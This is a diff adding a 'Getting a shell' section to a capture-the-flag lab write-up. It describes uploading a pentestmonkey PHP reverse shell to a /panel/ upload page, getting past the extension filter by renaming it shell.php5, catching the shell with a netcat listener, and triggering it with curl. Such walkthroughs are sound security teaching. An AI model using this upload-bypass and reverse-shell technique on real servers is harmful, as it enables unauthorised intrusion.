@@ -51,6 +51,50 @@ What is the hidden directory? : /panel/
 
 ## Task 3 Getting a shell
 
+1 - Lets try to browse into the hiden page `http://ip/panel/`
+
+looks like we found something interesting we can upload files so lets try to upload web shell and get a reverse shell to execute commands on the web server
+
+for this step we can use metasploit to generate php reverse shell or we can just take a shell and make some edits so for me i will use [Php reverse shell](php-reverse-shell) from pentestmonkey
+
+but we need to do some edits in the script before uploading on the webserver
+
+![image](https://user-images.githubusercontent.com/31727214/212399261-caeaf4cb-5bd3-4931-ae85-3fd08dcdbd01.png)
+
+```
+$ip : Attacker Machine IP
+```
+
+but we face an error here because we upoload shell.php file with php extension
+![image](https://user-images.githubusercontent.com/31727214/212399901-c3a497df-fbef-4612-9581-91163de18ac3.png)
+
+so let's try to escape this filtre by replacing php with php5 so the new structre of file extension will be like this `shell.php5` instead of `shell.php`
+
+![image](https://user-images.githubusercontent.com/31727214/212400487-4bad41e1-d506-4347-ae15-a867ddc4a216.png)
+
+Now we will execute our shell and start a netcat listener from Attacker Machine 
+
+To start netcat :
+`sudo nc -nlvp 9999`
+
+To execute our shell we will use `Curl` command 
+`curl hhtp://ip/uploads/shell.php5`
+
+![image](https://user-images.githubusercontent.com/31727214/212401848-6275af69-9ddb-45d0-a634-b790542f7ae7.png)
+
+Our shell executed succefully now we can capture the flag 
+
+As he said we need to search for `user.txt` file so we will use `find` command to execute this search
+
+Command : `find / -type f -name user.txt 2> /dev/null`
+
+We found the Path for `user.txt` so we will use `cat` to print the content of a file
+
+Command : `cat /var/www/user.txt`
+
+![image](https://user-images.githubusercontent.com/31727214/212402497-bcd8d010-6a4e-4e75-bdd7-fa72889ec7ae.png)
+
+## Task 4 Privilege escalation 
 
 
 
